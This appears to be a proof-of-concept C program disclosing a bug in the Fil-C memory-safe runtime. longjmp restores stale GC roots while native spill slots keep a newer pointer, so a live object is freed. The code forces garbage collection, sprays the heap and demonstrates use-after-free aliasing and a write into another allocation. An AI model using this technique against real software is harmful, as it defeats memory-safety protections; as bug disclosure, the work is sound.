/* PoC: longjmp() restores the Fil-C frame's GC root slots ("lowers") from the snapshot taken at
   setjmp() time, but the *native* spill slots of the same frame keep their newest values.  If an SSA
   value that is live across the setjmp was re-defined (loop) between setjmp and longjmp, the compiled
   code continues with the NEW pointer while the GC frame only roots the OLD one => live object is
   swept => use-after-free through a perfectly valid local variable.  No z* API is needed for the bug
   (zgc_request_and_wait only makes it deterministic). */
#include <setjmp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdfil.h>

struct handler { jmp_buf jb; };
static struct handler *handlers[2];

__attribute__((noinline)) static void work(int i)
{
    if (i == 1) {
        handlers[1] = NULL;               /* "pop" the inner handler */
        longjmp(handlers[0]->jb, 1);      /* throw to the outer one; its frame is still live */
    }
}

__attribute__((noinline)) static char *mk(int i)
{
    char *p = malloc(64);
    memset(p, 'A' + i, 64);
    return p;
}

#define NSPRAY 20000
static char *spray[NSPRAY];

__attribute__((noinline)) static void gc_and_spray(void)
{
    zgc_request_and_wait();
    zgc_request_and_wait();
    for (int k = 0; k < NSPRAY; k++) {
        spray[k] = malloc(64);
        strcpy(spray[k], "SECRET-belongs-to-another-object");
    }
}

int main(void)
{
    for (int i = 0; i < 2; i++) {
        char *p = mk(i);
        handlers[i] = malloc(sizeof(struct handler));
        if (setjmp(handlers[i]->jb)) {
            gc_and_spray();
            printf("p = %p, contents via p: \"%.40s\"\n", p, p);
            for (int k = 0; k < NSPRAY; k++) {
                if (spray[k] == p) {
                    printf("p aliases spray[%d] (a different, live malloc)\n", k);
                    p[0] = 'X';
                    printf("after p[0]='X': spray[%d] = \"%.40s\"\n", k, spray[k]);
                }
            }
            return 0;
        }
        work(i);
    }
    return 0;
}
